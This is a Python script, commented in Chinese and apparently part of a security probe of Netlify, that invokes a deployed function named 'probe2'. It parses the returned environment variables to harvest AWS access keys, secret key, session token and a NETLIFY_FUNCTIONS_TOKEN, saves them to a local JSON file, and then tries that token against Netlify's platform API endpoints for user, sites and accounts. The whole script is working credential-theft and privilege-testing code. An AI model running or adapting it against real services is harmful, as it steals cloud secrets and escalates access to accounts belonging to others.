# -*- coding: utf-8 -*-
"""Netlify:调用 probe2 保存完整响应,提取 AWS 凭证到 _aws_creds2.json,再本地验证平台 token 权限"""
import http.client, ssl, gzip, brotli, sys, json, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A

ctx = ssl.create_default_context()

def api(host, path, token, method='GET', headers_extra=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=60)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json',
         'Authorization': 'Bearer ' + token}
    if headers_extra:
        h.update(headers_extra)
    conn.request(method, path, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

# 1. 调用 probe2 拿完整响应
st, raw = api('sec-test-rcf6lz.netlify.app', '/.netlify/functions/probe2', TOKEN_A)
print('probe2 invoke:', st, 'len', len(raw))
text = raw.decode('utf-8', 'replace')
open(r'D:\scan\netlify_report\_probe2_full.txt', 'w', encoding='utf-8').write(text)

# 2. 提取 env 中的凭证
d = json.loads(text)
env_map = {}
for item in d.get('env', []):
    k, _, v = item.partition('=')
    env_map[k] = v
print('env keys:', len(env_map))
aws = {
    'access_key': env_map.get('AWS_ACCESS_KEY_ID', ''),
    'secret_key': env_map.get('AWS_SECRET_ACCESS_KEY', ''),
    'session_token': env_map.get('AWS_SESSION_TOKEN', ''),
    'account': env_map.get('AWS_ACCOUNT_ID', ''),
    'region': env_map.get('AWS_REGION', 'us-east-2'),
    'lambda_name': env_map.get('AWS_LAMBDA_FUNCTION_NAME', ''),
    'log_group': env_map.get('AWS_LAMBDA_LOG_GROUP_NAME', ''),
    'nf_token': env_map.get('NETLIFY_FUNCTIONS_TOKEN', ''),
    'site_id': env_map.get('SITE_ID', ''),
}
print('AWS_ACCESS_KEY_ID:', aws['access_key'])
print('AWS_ACCOUNT_ID:', aws['account'])
print('nf_token:', aws['nf_token'])
json.dump(aws, open(r'D:\scan\netlify_report\_aws_creds2.json', 'w'), indent=1)
print('saved _aws_creds2.json')

# 3. 本地验证 NETLIFY_FUNCTIONS_TOKEN 对平台 API 的权限
nf = aws['nf_token']
print()
print('=== NETLIFY_FUNCTIONS_TOKEN -> api.netlify.com ===')
for path in ['/api/v1/user', '/api/v1/sites?per_page=3', '/api/v1/accounts']:
    try:
        st2, raw2 = api('api.netlify.com', path, nf)
        print('GET %s -> %d %s' % (path, st2, raw2[:300].decode('utf-8', 'replace').replace('\n', ' ')))
    except Exception as e:
        print('GET %s ERR %s' % (path, str(e)[:100]))
